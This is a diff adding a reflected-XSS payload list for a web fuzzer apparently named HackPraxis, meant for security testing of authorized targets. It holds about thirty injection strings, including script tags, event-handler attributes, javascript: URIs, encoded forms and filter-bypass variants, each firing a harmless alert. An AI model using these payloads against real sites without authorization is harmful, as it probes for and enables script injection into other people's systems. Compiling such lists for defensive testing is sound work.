@@ -1,0 +1,34 @@
+# HackPraxis reflected-XSS test payloads.
+# Each is injected into the FUZZ point; HackPraxis flags a payload that comes
+# back UNESCAPED in the response (a strong reflected-XSS signal). Confirm a real
+# hit by trying it live in the iframe. Authorized targets only.
+<script>alert(1)</script>
+<ScRiPt>alert(1)</ScRiPt>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'"><svg onload=alert(1)>
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</style><script>alert(1)</script>
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<a href="javascript:alert(1)">x</a>
+<details open ontoggle=alert(1)>
+<input autofocus onfocus=alert(1)>
+<marquee onstart=alert(1)>
+"><input onfocus=alert(1) autofocus>
+javascript:alert(1)
+<img src=x onerror="alert(document.domain)">
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+"><body onpageshow=alert(1)>
+<video><source onerror=alert(1)>
+<math href="javascript:alert(1)">x</math>
+%3Cscript%3Ealert(1)%3C/script%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+<scr<script>ipt>alert(1)</scr</script>ipt>
+"onmouseover="alert(1)
+' onmouseover='alert(1)
